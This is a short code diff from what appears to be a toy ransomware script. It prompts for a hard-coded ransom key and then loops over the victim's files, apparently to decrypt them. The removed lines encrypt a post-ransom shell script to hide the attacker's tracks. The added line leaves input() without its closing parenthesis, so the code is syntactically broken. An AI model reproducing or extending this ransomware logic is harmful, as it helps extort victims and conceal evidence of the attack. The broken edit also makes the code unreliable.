@@ -19,15 +19,7 @@ with open("store.key", "rb") as thekey:
 
 secret_input_key = "samsepiol"
 
-user_input = input("SeCr3T KeY?:\n")
-
-hideur = Fernet.generate_key()
-
-with open("after_ransom_is_given_run_this.sh", "rb") as hideurtracks:
-    contents = hideurtracks.read()
-    hidemytracks = Fernet(hideur).encrypt(contents)
-with open("after_ransom_is_given_run_this.sh", "wb") as hideurtracks:
-    hideurtracks.write(hidemytracks)
+user_input = input("SeCr3T KeY?:\n"
 
 if user_input == secret_input_key:
     for file in files:
